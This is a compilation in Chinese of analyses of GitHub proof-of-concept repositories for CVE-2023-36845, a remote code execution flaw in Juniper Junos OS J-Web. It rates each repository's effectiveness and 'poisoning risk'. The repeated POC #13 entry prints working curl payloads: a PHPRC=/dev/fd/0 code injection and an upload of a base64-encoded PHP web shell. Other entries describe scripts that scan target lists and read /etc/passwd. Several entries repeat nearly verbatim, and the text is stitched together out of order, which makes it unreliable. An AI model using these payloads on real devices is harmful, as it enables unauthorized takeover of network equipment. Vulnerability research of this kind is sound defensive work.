**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改

**影响应用:** Junos OS J-Web

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 所有低于 20.4R3-S9 的版本；21.1 版本 21.1R1 及更高版本；21.2 版本低于 21.2R3-S7；21.3 版本低于 21.3R3-S5；21.4 版本低于 21.4R3-S5；22.1 版本低于 22.1R3-S4；22.2 版本低于 22.2R3-S2；22.3 版本低于 22.3R2-S2, 22.3R3-S1；22.4 版本低于 22.4R2-S1, 22.4R3；23.2 版本低于 23.2R1-S1, 23.2R2。

**利用条件:** 启用了 J-Web (HTTP 或 HTTPS) 的 Junos OS 设备。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 中 J-Web 界面的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过发送特制的请求，设置 `PHPRC` 变量来修改 PHP 执行环境，从而注入和执行任意代码。由于漏洞允许远程代码执行，因此风险评级为严重。

**漏洞利用方式：**

1.  攻击者发送一个特制的 HTTP 请求到易受攻击的 Junos 设备上的 J-Web 接口。
2.  此请求包含一个设置 `PHPRC` PHP 配置变量的参数。通过修改该变量，攻击者可以控制 PHP 的配置文件的路径，从而包含恶意的 PHP 代码。
3.  设备执行攻击者提供的 PHP 代码，从而允许攻击者在设备上执行任意命令。

**关于投毒风险：**

分析提供的 `Dockerfile` 和 `LICENSE` 文件，没有发现明显的恶意代码或编译过程中的可疑操作。 `Dockerfile` 只是一个简单的 Go 编译环境，`LICENSE` 是 Apache 2.0 许可。漏洞利用代码部分缺失，无法判断是否存在后门。

但是，考虑到漏洞本身允许远程代码执行，即使提供的 `Dockerfile` 和 `LICENSE` 没有直接的投毒代码，攻击者仍然可以利用该漏洞在目标系统上植入恶意软件。因此，存在一定的投毒风险，假设为10%。

**项目地址:** [vulncheck-oss/cve-2023-36845-scanner](https://github.com/vulncheck-oss/cve-2023-36845-scanner)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #17

**来源**: [CVE-2023-36845-zaenhaxor_CVE-2023-36845.md](../2023/CVE-2023-36845-zaenhaxor_CVE-2023-36845.md)

## CVE-2023-36845-Junos OS-远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致远程代码执行

**影响应用:** Junos OS (EX Series 和 SRX Series) J-Web

**危害等级:** 高危，未授权远程代码执行

**影响版本:** 受影响版本: 所有版本 prior to 20.4R3-S9; 21.1 versions 21.1R1 and later; 21.2 versions prior to 21.2R3-S7; 21.3 versions prior to 21.3R3-S5; 21.4 versions prior to 21.4R3-S5; 22.1 versions prior to 22.1R3-S4; 22.2 versions prior to 22.2R3-S2; 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; 22.4 versions prior to 22.4R2-S1, 22.4R3; 23.2 versions prior to 23.2R1-S1, 23.2R2.

**利用条件:** 需要开启J-Web服务 (http或https)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-36845 存在于Juniper Networks Junos OS 的 J-Web 组件中。攻击者可以通过设置 `PHPRC` 环境变量来修改 PHP 运行环境，从而远程执行代码。提供的 `cve.sh` 脚本读取一个包含目标主机列表的文件，然后通过构造包含恶意 `PHPRC` 参数的 HTTP 请求，尝试在目标系统上执行代码。脚本通过检查响应中是否包含 `root:` 字符串来判断漏洞是否成功利用，这是因为脚本尝试通过 `auto_prepend_file` 包含 `/etc/passwd` 文件。 

**有效性：**
POC 代码利用了 PHP 外部变量修改漏洞，通过设置 PHPRC 环境变量来包含任意文件，从而实现远程代码执行。该方法被广泛报道，并且CISA KEV 已经收录，确定了其有效性。

**投毒风险：**
脚本本身相对简单，主要功能是发送 HTTP 请求并检查响应。 投毒风险主要体现在以下几个方面：
*   **明面上的风险：** 脚本使用 curl 命令发送请求，存在被中间人攻击的风险，导致信息泄露或者被篡改。
*   **隐藏的风险：** 虽然脚本代码较为简短，但依然存在作者在其他地方植入恶意代码的可能性，比如通过读取其他配置文件、调用外部命令等方式。但是从目前的代码来看，直接的投毒风险较低， 评估为5%。

**利用方式：**
1.  **确定目标:**  需要一个存在漏洞且开启了 J-Web 服务的 Juniper 设备。
2.  **准备攻击脚本：** 使用提供的 `cve.sh` 脚本。
3.  **构造目标列表：** 创建一个包含目标设备 IP 地址或域名的文本文件（例如 `file.txt`）。
4.  **执行攻击：** 运行 `bash cve.sh file.txt` 命令。
5.  **验证结果：** 脚本会输出哪些主机存在漏洞（`VULN`）。


**项目地址:** [zaenhaxor/CVE-2023-36845](https://github.com/zaenhaxor/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---



---

## POC #11

**来源**: [CVE-2023-36845-iveresk_CVE-2023-36845-6-.md](../2023/CVE-2023-36845-iveresk_CVE-2023-36845-6-.md)

## CVE-2023-36845 Juniper Junos OS J-Web RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Junos OS J-Web (EX and SRX Series)

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本见CVE描述：所有版本 prior to 20.4R3-S9; 21.1 versions 21.1R1 and later; 21.2 versions prior to 21.2R3-S7; 21.3 versions prior to 21.3R3-S5; 21.4 versions prior to 21.4R3-S5; 22.1 versions prior to 22.1R3-S4; 22.2 versions prior to 22.2R3-S2; 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; 22.4 versions prior to 22.4R2-S1, 22.4R3; 23.2 versions prior to 23.2R1-S1, 23.2R2.

**利用条件:** 目标设备已启用 J-Web 服务 (HTTP 或 HTTPS)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS EX 和 SRX 系列的 J-Web 组件中的一个 PHP 外部变量修改漏洞。该漏洞允许未经身份验证的远程攻击者通过构造特殊的请求来修改 PHP 的执行环境，从而实现远程代码执行。

**利用方式：**

攻击者通过设置 `PHPRC` 环境变量为 `/dev/fd/0`，并通过 `data-binary` 参数传递 PHP 代码。 由于`/dev/fd/0`代表标准输入，攻击者可以将任意PHP代码写入到标准输入中，这些代码会被作为PHP配置文件执行。 在提供的POC中，利用`auto_prepend_file`指令包含`/etc/passwd`文件，从而验证漏洞的存在。 实际的利用中，攻击者可以注入任意的恶意PHP代码，实现远程代码执行。

**有效性：**
提供的 POC 代码通过 curl 发送一个带有恶意 `PHPRC` 参数的 HTTP 请求。 该请求的目标是 `/about.php` 页面，并尝试包含 `/etc/passwd` 文件。 如果目标存在漏洞，则响应中会包含 `/etc/passwd` 的内容，证明 POC 有效。

**投毒风险：**

提供的脚本非常简单，主要功能就是发送包含恶意参数的请求。该脚本没有发现明显的投毒代码。但是，用户需要注意下载的脚本来源，防止被恶意替换。

根据现有信息，代码本身直接包含恶意代码的可能性较低。风险主要在于代码作者可能在其他地方埋藏恶意链接，或者在其他恶意软件中捆绑该脚本。 因此，判断投毒风险为0%。


**项目地址:** [iveresk/CVE-2023-36845-6-](https://github.com/iveresk/CVE-2023-36845-6-)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #12

**来源**: [CVE-2023-36845-jahithoque_Juniper-CVE-2023-36845-Mass-Hunting.md](../2023/CVE-2023-36845-jahithoque_Juniper-CVE-2023-36845-Mass-Hunting.md)

## CVE-2023-36845-Junos OS-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行

**影响应用:** Junos OS (EX Series, SRX Series)

**危害等级:** 严重，允许未经身份验证的远程攻击者执行代码

**影响版本:** 受影响版本包括但不限于：20.4R3-S9之前的所有版本，21.1，21.2R3-S7之前的所有版本，21.3R3-S5之前的所有版本，21.4R3-S5之前的所有版本，22.1R3-S4之前的所有版本，22.2R3-S2之前的所有版本，22.3R2-S2, 22.3R3-S1之前的所有版本，22.4R2-S1, 22.4R3之前的所有版本，23.2R1-S1, 23.2R2之前的所有版本。

**利用条件:** 需要开启J-Web，且可以通过网络访问J-Web服务 (http 或 https)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 的 J-Web 组件中的一个 PHP 外部变量修改漏洞。攻击者可以通过构造恶意请求，设置 `PHPRC` 环境变量来修改 PHP 的执行环境，从而注入并执行任意代码。

**漏洞利用方式：**

1.  **攻击向量：** 网络
2.  **攻击条件：** 目标设备必须运行受影响版本的 Junos OS，并且启用了 J-Web 管理界面 (http 或 https)。
3.  **漏洞原理：** 通过 `PHPRC` 环境变量，指定一个包含恶意 PHP 代码的文件。由于 J-Web 对该变量的过滤不严，导致 PHP 在执行时会加载并执行该文件，从而实现远程代码执行。
4.  **POC 分析：** 提供的 `Juniper-RCE-Check.sh` 脚本通过发送包含恶意 `PHPRC` 参数的 HTTP 请求到 `/about.php` 页面，其中PHPRC的值被设置为 `/dev/fd/0`，并使用`auto_prepend_file` 尝试将 `/etc/passwd` 的内容包含到响应中。如果响应中包含 `root:` 字符串，则表示目标存在漏洞，攻击者可以利用此漏洞执行任意代码。

**投毒风险分析：**

提供的 `Juniper-RCE-Check.sh` 脚本的功能是检测目标是否存在 CVE-2023-36845 漏洞，而不是进行漏洞利用或植入后门。该脚本只是通过 `curl` 命令发送一个 HTTP 请求，并检查响应的内容。其中使用的`/etc/passwd`只是用于验证，并不会对目标系统造成永久性影响。LICENSE文件也是标准的Creative Commons协议。

**有效性：**
根据漏洞库信息和提供的POC脚本，可以确定该漏洞利用是有效的。POC脚本验证了通过修改`PHPRC`环境变量，攻击者能够控制PHP的执行，从而读取敏感文件 (例如 `/etc/passwd`)。结合漏洞描述，可以推断出利用该漏洞执行任意代码是可行的。

**结论：**
该漏洞为高危漏洞，利用简单，影响范围广。强烈建议受影响的用户及时升级到安全版本。

**项目地址:** [jahithoque/Juniper-CVE-2023-36845-Mass-Hunting](https://github.com/jahithoque/Juniper-CVE-2023-36845-Mass-Hunting)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #13

**来源**: [CVE-2023-36845-kljunowsky_CVE-2023-36845.md](../2023/CVE-2023-36845-kljunowsky_CVE-2023-36845.md)

## CVE-2023-36845-Juniper Junos OS J-Web PHP 外部变量修改 RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启 J-Web 服务，且运行于受影响的 Junos OS 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞存在于 Juniper Networks Junos OS 的 J-Web 界面中。未经身份验证的攻击者可以通过修改 PHP 的 `PHPRC` 环境变量，从而控制 PHP 的执行环境，最终实现远程代码执行。

**漏洞利用方式：**

1.  **利用 PHPRC 变量:** 攻击者发送特制的 HTTP 请求，其中包含 `PHPRC` 参数，将其指向一个可控的文件描述符 `/dev/fd/0`。利用`auto_prepend_file`参数，加载恶意代码，例如使用 `data://` 协议嵌入经过 base64 编码的 PHP 代码。简单的例子就是读取/etc/passwd 文件进行漏洞验证。

```
curl "http://target.tld/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'
```
2.  **上传文件:**  攻击者可以通过 `/webauth_operation.php` 接口上传包含恶意代码的 PHP 文件，然后通过访问该文件执行恶意代码。
```
$ curl http://target.tld/webauth_operation.php -d 'rs=do_upload&rsargs[]=[{"fileName": "shell.php", "fileData": ",PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUW2NtZF0pKXsgZWNobyAiPHByZT4iOyAkY21kID0gKCRfUkVRVUVTVFtjbWRdKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pgo=\n", "csize": 110}]'
```

**投毒风险分析：**

提供的漏洞利用代码主要用于检测漏洞是否存在，通过读取 `/etc/passwd` 文件进行验证。虽然此行为本身不属于投毒，但如果攻击者利用此代码大规模扫描网络，可能会引起目标系统的注意。

RCE 的方法演示中，利用 `data://` 协议执行任意 PHP 代码，存在一定的风险，攻击者可以利用此方法植入后门代码。上传文件的攻击利用方式，需要找到对应的上传点，并绕过文件上传限制，复杂性较高。

LICENSE文件为MIT许可证，相对安全。
README.md文件提供了Shodan搜索方法和利用方式，整体风险较低，但存在被恶意利用的可能。综合考虑，投毒风险评估为10%。CISA已将此漏洞加入到已知被利用的漏洞目录，证明该漏洞已经被恶意利用。


**项目地址:** [kljunowsky/CVE-2023-36845](https://github.com/kljunowsky/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #14

**来源**: [CVE-2023-36845-kopfjager007_CVE-2023-36845.md](../2023/CVE-2023-36845-kopfjager007_CVE-2023-36845.md)

## CVE-2023-36845

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本见漏洞库信息

**利用条件:** 目标设备开启 J-Web (http 或 https)

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是一个 Juniper Junos OS EX 系列和 SRX 系列设备 J-Web 组件中的 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过构造恶意请求设置 PHPRC 变量来修改 PHP 执行环境，从而注入并执行任意代码。

**有效性评估：**
根据漏洞库信息，该漏洞是真实存在的，CVSS 评分为 9.8 (Critical)，表明危害程度很高。CISA 已将其添加到已知被利用漏洞目录中，进一步表明该漏洞已被积极利用。

**投毒风险评估：**
提供的漏洞利用代码只是一个包含 README.md 文件的目录。README.md 文件仅包含漏洞名称和简短描述，没有实际的利用代码。因此，该代码本身不存在直接的投毒风险。

但是，需要注意的是，攻击者可能会在其他地方发布包含恶意代码的利用程序，伪装成 CVE-2023-36845 的利用程序。因此，在下载和使用任何利用代码时，都应该进行仔细审查，确保代码的安全性。
由于缺少实际的代码，无法进行更详细的分析，投毒风险评估相对保守。

**利用方式：**
1.  **前提条件：** 目标 Juniper 设备运行受影响的 Junos OS 版本，并且启用了 J-Web 服务（通过 HTTP 或 HTTPS）。
2.  **漏洞触发：** 攻击者构造一个包含 `PHPRC` 变量的 HTTP 请求发送到目标设备的 J-Web 接口。
3.  **代码注入：** 通过 `PHPRC` 变量，攻击者可以指定一个包含恶意 PHP 代码的文件路径，从而修改 PHP 的配置。
4.  **远程代码执行：** 当 J-Web 执行 PHP 代码时，恶意代码将被执行，从而允许攻击者在目标设备上执行任意命令。
5.  **进一步利用：** 攻击者可以通过执行的命令获取系统信息、修改配置、安装后门等，从而完全控制目标设备。

**项目地址:** [kopfjager007/CVE-2023-36845](https://github.com/kopfjager007/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #15

**来源**: [CVE-2023-36845-simrotion13_CVE-2023-36845.md](../2023/CVE-2023-36845-simrotion13_CVE-2023-36845.md)

## CVE-2023-36845-Juniper-J-Web-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改

**影响应用:** Junos OS J-Web (EX系列和SRX系列)

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启了J-Web管理界面，并且允许通过HTTP或HTTPS访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Juniper Junos OS的J-Web管理界面中。攻击者可以通过修改`PHPRC`环境变量，控制PHP的配置，进而执行任意代码。

**漏洞利用方式：**

1.  攻击者发送一个特制的HTTP POST请求到目标J-Web服务器。
2.  该请求包含一个`PHPRC`参数，该参数被设置为指向一个恶意PHP配置文件或包含恶意代码的文件，例如`/dev/fd/0`，并结合`auto_prepend_file`包含`/etc/passwd`。
3.  由于`PHPRC`环境变量被修改，PHP在处理后续请求时会加载攻击者提供的恶意配置。
4.  通过`auto_prepend_file`，强制包含`/etc/passwd`文件内容,以验证漏洞存在。
5. 最终导致攻击者可以远程执行任意代码。

**有效性：**

提供的PoC代码是有效的，它通过`curl`命令发送带有恶意`PHPRC`参数的请求来验证漏洞。如果目标存在漏洞，将会返回`/etc/passwd`的内容，`grep -i 'root:'` 用于检测`/etc/passwd`是否存在，从而判断目标是否漏洞。

**投毒风险：**

分析提供的PoC代码，未发现明显的投毒代码。PoC代码的功能是发送恶意请求并验证漏洞是否存在，并没有执行任何恶意操作（例如植入后门），风险等级判定为0%。


**项目地址:** [simrotion13/CVE-2023-36845](https://github.com/simrotion13/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #16

**来源**: [CVE-2023-36845-vulncheck-oss_cve-2023-36845-scanner.md](../2023/CVE-2023-36845-vulncheck-oss_cve-2023-36845-scanner.md)

## CVE-2023-36845-Junos OS-J-Web-PHP外部变量修改-远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改

**影响应用:** Junos OS J-Web

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 所有低于 20.4R3-S9 的版本；21.1 版本 21.1R1 及更高版本；21.2 版本低于 21.2R3-S7；21.3 版本低于 21.3R3-S5；21.4 版本低于 21.4R3-S5；22.1 版本低于 22.1R3-S4；22.2 版本低于 22.2R3-S2；22.3 版本低于 22.3R2-S2, 22.3R3-S1；22.4 版本低于 22.4R2-S1, 22.4R3；23.2 版本低于 23.2R1-S1, 23.2R2。

**利用条件:** 启用了 J-Web (HTTP 或 HTTPS) 的 Junos OS 设备。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 中 J-Web 界面的一个 PHP 外部变量修改漏洞。未经身份验证的远程攻击者可以通过发送特制的请求，设置 `PHPRC` 变量来修改 PHP 执行环境，从而注入和执行任意代码。由于漏洞允许远程代码执行，因此风险评级为严重。

**漏洞利用方式：**

1.  攻击者发送一个特制的 HTTP 请求到易受攻击的 Junos 设备上的 J-Web 接口。
2.  此请求包含一个设置 `PHPRC` PHP 配置变量的参数。通过修改该变量，攻击者可以控制 PHP 的配置文件的路径，从而包含恶意的 PHP 代码。
3.  设备执行攻击者提供的 PHP 代码，从而允许攻击者在设备上执行任意命令。

**关于投毒风险：**

分析提供的 `Dockerfile` 和 `LICENSE` 文件，没有发现明显的恶意代码或编译过程中的可疑操作。 `Dockerfile` 只是一个简单的 Go 编译环境，`LICENSE` 是 Apache 2.0 许可。漏洞利用代码部分缺失，无法判断是否存在后门。

但是，考虑到漏洞本身允许远程代码执行，即使提供的 `Dockerfile` 和 `LICENSE` 没有直接的投毒代码，攻击者仍然可以利用该漏洞在目标系统上植入恶意软件。因此，存在一定的投毒风险，假设为10%。

**项目地址:** [vulncheck-oss/cve-2023-36845-scanner](https://github.com/vulncheck-oss/cve-2023-36845-scanner)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #17

**来源**: [CVE-2023-36845-zaenhaxor_CVE-2023-36845.md](../2023/CVE-2023-36845-zaenhaxor_CVE-2023-36845.md)

## CVE-2023-36845-Junos OS-远程代码执行

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP外部变量修改导致远程代码执行

**影响应用:** Junos OS (EX Series 和 SRX Series) J-Web

**危害等级:** 高危，未授权远程代码执行

**影响版本:** 受影响版本: 所有版本 prior to 20.4R3-S9; 21.1 versions 21.1R1 and later; 21.2 versions prior to 21.2R3-S7; 21.3 versions prior to 21.3R3-S5; 21.4 versions prior to 21.4R3-S5; 22.1 versions prior to 22.1R3-S4; 22.2 versions prior to 22.2R3-S2; 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; 22.4 versions prior to 22.4R2-S1, 22.4R3; 23.2 versions prior to 23.2R1-S1, 23.2R2.

**利用条件:** 需要开启J-Web服务 (http或https)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-36845 存在于Juniper Networks Junos OS 的 J-Web 组件中。攻击者可以通过设置 `PHPRC` 环境变量来修改 PHP 运行环境，从而远程执行代码。提供的 `cve.sh` 脚本读取一个包含目标主机列表的文件，然后通过构造包含恶意 `PHPRC` 参数的 HTTP 请求，尝试在目标系统上执行代码。脚本通过检查响应中是否包含 `root:` 字符串来判断漏洞是否成功利用，这是因为脚本尝试通过 `auto_prepend_file` 包含 `/etc/passwd` 文件。 

**有效性：**
POC 代码利用了 PHP 外部变量修改漏洞，通过设置 PHPRC 环境变量来包含任意文件，从而实现远程代码执行。该方法被广泛报道，并且CISA KEV 已经收录，确定了其有效性。

**投毒风险：**
脚本本身相对简单，主要功能是发送 HTTP 请求并检查响应。 投毒风险主要体现在以下几个方面：
*   **明面上的风险：** 脚本使用 curl 命令发送请求，存在被中间人攻击的风险，导致信息泄露或者被篡改。
*   **隐藏的风险：** 虽然脚本代码较为简短，但依然存在作者在其他地方植入恶意代码的可能性，比如通过读取其他配置文件、调用外部命令等方式。但是从目前的代码来看，直接的投毒风险较低， 评估为5%。

**利用方式：**
1.  **确定目标:**  需要一个存在漏洞且开启了 J-Web 服务的 Juniper 设备。
2.  **准备攻击脚本：** 使用提供的 `cve.sh` 脚本。
3.  **构造目标列表：** 创建一个包含目标设备 IP 地址或域名的文本文件（例如 `file.txt`）。
4.  **执行攻击：** 运行 `bash cve.sh file.txt` 命令。
5.  **验证结果：** 脚本会输出哪些主机存在漏洞（`VULN`）。


**项目地址:** [zaenhaxor/CVE-2023-36845](https://github.com/zaenhaxor/CVE-2023-36845)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---



---

## POC #11

**来源**: [CVE-2023-36845-iveresk_CVE-2023-36845-6-.md](../2023/CVE-2023-36845-iveresk_CVE-2023-36845-6-.md)

## CVE-2023-36845 Juniper Junos OS J-Web RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Junos OS J-Web (EX and SRX Series)

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本见CVE描述：所有版本 prior to 20.4R3-S9; 21.1 versions 21.1R1 and later; 21.2 versions prior to 21.2R3-S7; 21.3 versions prior to 21.3R3-S5; 21.4 versions prior to 21.4R3-S5; 22.1 versions prior to 22.1R3-S4; 22.2 versions prior to 22.2R3-S2; 22.3 versions prior to 22.3R2-S2, 22.3R3-S1; 22.4 versions prior to 22.4R2-S1, 22.4R3; 23.2 versions prior to 23.2R1-S1, 23.2R2.

**利用条件:** 目标设备已启用 J-Web 服务 (HTTP 或 HTTPS)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Junos OS EX 和 SRX 系列的 J-Web 组件中的一个 PHP 外部变量修改漏洞。该漏洞允许未经身份验证的远程攻击者通过构造特殊的请求来修改 PHP 的执行环境，从而实现远程代码执行。

**利用方式：**

攻击者通过设置 `PHPRC` 环境变量为 `/dev/fd/0`，并通过 `data-binary` 参数传递 PHP 代码。 由于`/dev/fd/0`代表标准输入，攻击者可以将任意PHP代码写入到标准输入中，这些代码会被作为PHP配置文件执行。 在提供的POC中，利用`auto_prepend_file`指令包含`/etc/passwd`文件，从而验证漏洞的存在。 实际的利用中，攻击者可以注入任意的恶意PHP代码，实现远程代码执行。

**有效性：**
提供的 POC 代码通过 curl 发送一个带有恶意 `PHPRC` 参数的 HTTP 请求。 该请求的目标是 `/about.php` 页面，并尝试包含 `/etc/passwd` 文件。 如果目标存在漏洞，则响应中会包含 `/etc/passwd` 的内容，证明 POC 有效。

**投毒风险：**

提供的脚本非常简单，主要功能就是发送包含恶意参数的请求。该脚本没有发现明显的投毒代码。但是，用户需要注意下载的脚本来源，防止被恶意替换。

根据现有信息，代码本身直接包含恶意代码的可能性较低。风险主要在于代码作者可能在其他地方埋藏恶意链接，或者在其他恶意软件中捆绑该脚本。 因此，判断投毒风险为0%。


**项目地址:** [iveresk/CVE-2023-36845-6-](https://github.com/iveresk/CVE-2023-36845-6-)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #12

**来源**: [CVE-2023-36845-jahithoque_Juniper-CVE-2023-36845-Mass-Hunting.md](../2023/CVE-2023-36845-jahithoque_Juniper-CVE-2023-36845-Mass-Hunting.md)

## CVE-2023-36845-Junos OS-PHP外部变量修改导致RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** 远程代码执行

**影响应用:** Junos OS (EX Series, SRX Series)

**危害等级:** 严重，允许未经身份验证的远程攻击者执行代码

**影响版本:** 受影响版本包括但不限于：20.4R3-S9之前的所有版本，21.1，21.2R3-S7之前的所有版本，21.3R3-S5之前的所有版本，21.4R3-S5之前的所有版本，22.1R3-S4之前的所有版本，22.2R3-S2之前的所有版本，22.3R2-S2, 22.3R3-S1之前的所有版本，22.4R2-S1, 22.4R3之前的所有版本，23.2R1-S1, 23.2R2之前的所有版本。

**利用条件:** 需要开启J-Web，且可以通过网络访问J-Web服务 (http 或 https)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-36845 是 Juniper Networks Junos OS 的 J-Web 组件中的一个 PHP 外部变量修改漏洞。攻击者可以通过构造恶意请求，设置 `PHPRC` 环境变量来修改 PHP 的执行环境，从而注入并执行任意代码。

**漏洞利用方式：**

1.  **攻击向量：** 网络
2.  **攻击条件：** 目标设备必须运行受影响版本的 Junos OS，并且启用了 J-Web 管理界面 (http 或 https)。
3.  **漏洞原理：** 通过 `PHPRC` 环境变量，指定一个包含恶意 PHP 代码的文件。由于 J-Web 对该变量的过滤不严，导致 PHP 在执行时会加载并执行该文件，从而实现远程代码执行。
4.  **POC 分析：** 提供的 `Juniper-RCE-Check.sh` 脚本通过发送包含恶意 `PHPRC` 参数的 HTTP 请求到 `/about.php` 页面，其中PHPRC的值被设置为 `/dev/fd/0`，并使用`auto_prepend_file` 尝试将 `/etc/passwd` 的内容包含到响应中。如果响应中包含 `root:` 字符串，则表示目标存在漏洞，攻击者可以利用此漏洞执行任意代码。

**投毒风险分析：**

提供的 `Juniper-RCE-Check.sh` 脚本的功能是检测目标是否存在 CVE-2023-36845 漏洞，而不是进行漏洞利用或植入后门。该脚本只是通过 `curl` 命令发送一个 HTTP 请求，并检查响应的内容。其中使用的`/etc/passwd`只是用于验证，并不会对目标系统造成永久性影响。LICENSE文件也是标准的Creative Commons协议。

**有效性：**
根据漏洞库信息和提供的POC脚本，可以确定该漏洞利用是有效的。POC脚本验证了通过修改`PHPRC`环境变量，攻击者能够控制PHP的执行，从而读取敏感文件 (例如 `/etc/passwd`)。结合漏洞描述，可以推断出利用该漏洞执行任意代码是可行的。

**结论：**
该漏洞为高危漏洞，利用简单，影响范围广。强烈建议受影响的用户及时升级到安全版本。

**项目地址:** [jahithoque/Juniper-CVE-2023-36845-Mass-Hunting](https://github.com/jahithoque/Juniper-CVE-2023-36845-Mass-Hunting)

**漏洞详情:** [CVE-2023-36845](https://nvd.nist.gov/vuln/detail/CVE-2023-36845)

---

## POC #13

**来源**: [CVE-2023-36845-kljunowsky_CVE-2023-36845.md](../2023/CVE-2023-36845-kljunowsky_CVE-2023-36845.md)

## CVE-2023-36845-Juniper Junos OS J-Web PHP 外部变量修改 RCE

**漏洞编号:** CVE-2023-36845

**漏洞类型:** PHP 外部变量修改

**影响应用:** Juniper Junos OS J-Web

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本请参考漏洞库信息

**利用条件:** 目标设备开启 J-Web 服务，且运行于受影响的 Junos OS 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-36845 漏洞存在于 Juniper Networks Junos OS 的 J-Web 界面中。未经身份验证的攻击者可以通过修改 PHP 的 `PHPRC` 环境变量，从而控制 PHP 的执行环境，最终实现远程代码执行。

**漏洞利用方式：**

1.  **利用 PHPRC 变量:** 攻击者发送特制的 HTTP 请求，其中包含 `PHPRC` 参数，将其指向一个可控的文件描述符 `/dev/fd/0`。利用`auto_prepend_file`参数，加载恶意代码，例如使用 `data://` 协议嵌入经过 base64 编码的 PHP 代码。简单的例子就是读取/etc/passwd 文件进行漏洞验证。

```
curl "http://target.tld/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'
```
2.  **上传文件:**  攻击者可以通过 `/webauth_operation.php` 接口上传包含恶意代码的 PHP 文件，然后通过访问该文件执行恶意代码。
```
$ curl http://target.tld/webauth_operation.php -d 'rs=do_upload&rsargs[]=[{"fileName": "shell.php", "fileData": ",PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUW2NtZF0pKXsgZWNobyAiPHByZT4iOyAkY21kID0gKCRfUkVRVUVTVFtjbWRdKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pgo=\n", "csize": 110}]'
```

**投毒风险分析：**

提供的漏洞利用代码主要用于检测漏洞是否存在，通过读取 `/etc/passwd` 文件进行验证。虽然此行为本身不属于投毒，但如果攻击者利用此代码大规模扫描网络，可能会引起目标系统的注意。

RCE 的方法演示中，利用 `data://` 协议执行任意 PHP 代码，存在一定的风险，攻击者可以利用此方法植入后门代码。上传文件的攻击利用方式，需要找到对应的上传点，并绕过文件上传限制，复杂性较高。

